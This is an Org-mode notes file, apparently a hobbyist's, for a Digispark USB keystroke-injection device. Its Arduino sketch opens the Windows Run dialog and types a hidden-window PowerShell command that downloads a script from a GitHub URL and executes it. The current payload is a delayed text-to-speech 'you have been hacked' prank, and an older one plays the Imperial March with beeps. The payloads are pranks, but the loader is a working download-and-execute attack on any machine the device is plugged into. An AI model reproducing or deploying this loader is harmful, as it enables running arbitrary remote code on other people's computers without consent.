#+TITLE: My Digispark playground
#+auto_tangle: t


:toc:
- [[#about][About]]
- [[#execute_powershell_scriptino][Execute_Powershell_Script.ino]]
- [[#scriptps1][script.ps1]]
  - [[#old-payloads][Old payloads]]

* About
In this org file the arduino script for my digispark is described and several payloads which are hosted on my Github.

* Execute_Powershell_Script.ino

#+begin_src C :tangle Powershell.ino
#include "DigiKeyboard.h"

void setup() {
  // empty
}

void loop() {
  // Initialise digispark
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(600);

  // Opens the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Writes the command
  DigiKeyboard.print("powershell -w h ");
  DigiKeyboard.print("iex (irm \"");
  DigiKeyboard.print("https://raw.githubusercontent.com/Prutserdt/dotfiles/master/Stack/Code/Powershell/script.ps1");  // The payload is here :-)
  DigiKeyboard.print("\")");
  // Enters it
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {/* Stops the loop */}
}
#+end_src

* Some powershell tips




* script.ps1
The next code block is my current script that is deployed by my Digispark and hosted on Github.


#+begin_src shell :tangle script.ps1
# Wait for 120 seconds before running next part
Start-Sleep -Seconds 120
# Text to speech :-)
Add-Type -AssemblyName System.speech
$s = New-Object System.Speech.Synthesis.SpeechSynthesizer
$s.Speak("Yo, yo. You have been hacked. Please wave to the camera. Ha, ha. Fortunately this is just for shits and giggles. But. Remember. You could have been seriously compromized. Over and out. Peace.")
#+end_src






** Old payloads

Plays the Imperial March (Star Wars)
This PowerShell script plays the Imperial March used in the Star Wars film series.
https://github.com/fleschutz/PowerShell
NOTES: Author: Markus Fleschutz | License: CC0
#+begin_src shell
[System.Console]::beep(440, 500)
[System.Console]::beep(440, 500)
[System.Console]::beep(440, 500)
[System.Console]::beep(349, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(440, 500)
[System.Console]::beep(349, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(440, 1000)
[System.Console]::beep(659, 500)
[System.Console]::beep(659, 500)
[System.Console]::beep(659, 500)
[System.Console]::beep(698, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(415, 500)
[System.Console]::beep(349, 350)
[System.Console]::beep(523, 150)
[System.Console]::beep(440, 1000)
exit 0 # success
#+end_src
